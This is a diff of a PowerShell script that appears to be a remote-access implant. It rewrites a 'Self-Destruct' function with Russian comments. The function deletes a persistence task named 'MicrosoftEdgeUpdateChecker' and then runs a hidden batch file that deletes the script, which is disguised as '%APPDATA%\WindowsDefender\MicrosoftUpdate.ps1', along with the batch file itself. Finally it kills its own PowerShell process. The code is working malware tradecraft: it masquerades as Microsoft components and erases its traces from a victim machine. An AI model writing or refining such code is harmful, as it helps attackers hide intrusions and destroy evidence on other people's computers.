@@ -278,37 +278,37 @@ function Connect-ZiPo {
 
     function Self-Destruct {
     try {
-        $scriptPath = "$env:APPDATA\WindowsDefender\MicrosoftUpdate.ps1"
+        $scriptPath = $MyInvocation.MyCommand.Path
+        if (-not $scriptPath) {
+            $scriptPath = "$env:APPDATA\WindowsDefender\MicrosoftUpdate.ps1"
+        }
+
         $taskName = "MicrosoftEdgeUpdateChecker"
 
-        # Удаление основной задачи
+        # Удалить задачу автозапуска
         schtasks /Delete /TN $taskName /F | Out-Null
 
-        # Создание задачи, которая удалит скрипт через 1 минуту
-        $cleanupScript = "$env:TEMP\cleanup.ps1"
-        $bat = "$env:TEMP\cleanup.bat"
+        # Создать bat-файл для удаления скрипта и самого себя
+        $batPath = "$env:TEMP\cleanup.bat"
+        $bat = "@echo off`r`n" +
+               "timeout /t 3 > nul`r`n" +
+               "del `"$scriptPath`" /f /q`r`n" +
+               "del `"%~f0`" /f /q"
 
-        @"
-Start-Sleep -Seconds 15
-Remove-Item -Path `"$scriptPath`" -Force -ErrorAction SilentlyContinue
-schtasks /Delete /TN CleanupTask /F
-"@ | Set-Content -Path $cleanupScript -Encoding ASCII
+        $bat | Set-Content -Path $batPath -Encoding ASCII
 
-        @"
-powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$cleanupScript`"
-"@ | Set-Content -Path $bat -Encoding ASCII
+        # Запустить .bat для удаления .ps1
+        Start-Process -FilePath $batPath -WindowStyle Hidden
 
-        schtasks /Create /SC ONCE /TN CleanupTask `
-            /TR "$bat" `
-            /ST $(Get-Date).AddMinutes(1).ToString("HH:mm") `
-            /RL HIGHEST /F | Out-Null
-
-        return "[+] Self-destruct scheduled in 1 minute"
+        # Завершить текущий PowerShell-процесс
+        Start-Sleep -Seconds 2
+        Stop-Process -Id $PID -Force
     }
     catch {
         return "[ERROR] Self-destruct failed: $($_.Exception.Message)"
     }
 }
+
 
 
 
